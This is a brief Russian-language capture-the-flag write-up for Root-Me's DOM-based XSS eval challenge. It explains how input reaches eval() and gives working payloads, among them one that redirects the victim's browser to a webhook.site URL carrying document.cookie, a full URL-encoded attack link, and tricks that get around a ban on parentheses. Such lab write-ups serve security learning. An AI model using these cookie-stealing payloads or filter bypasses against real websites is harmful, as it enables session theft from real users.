<--https://www.root-me.org/fr/Challenges/Web-Client/XSS-DOM-Based-Eval-->
<-!
	1. Изначально я обратил внимание, что вводимые данные (я ввел: 1+1) вставляются в строчки 
            var result = eval(1+1);
            document.getElementById('state').innerText = '1+1 = ' + result;
     важно понимать, что именно две строчки работают с этими данными, также на моменте разведки я получил запрет на использование '()'.
  2. Спустя некоторое время, payload был найден (уведомление получено):
            1+1,';alert`1`; a= '
  3. Еще спустя время, я проэксплуатировал найденную уязвимость так:
            1+1,'; document.location.href = `https://webhook.site/3a03bfae-c84f-4579-9357-5a1b288d82f2?coook=${document.cookie}`; a= '
  4. конечная ссылка для /contact:
            http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%2C%27%3B+document.location.href+%3D+%60https%3A%2F%2Fwebhook.site%2F3a03bfae-c84f-4579-9357-5a1b288d82f2%3Fcoook%3D%24%7Bdocument.cookie%7D%60%3B+a%3D+%27
-->


UPD:
  Отличное решение было в использовать концтрукцию eval.apply`${[`HEX_PAYLOAD_HERE`]}` в данном контексте PoC выглядит так:
	1+1,eval.apply`${["\x61\x6c\x65\x72\x74\x28\x31\x29"]}`
  Похожее, но еще проще решение:
	eval(1+1, [alert`1`]) 
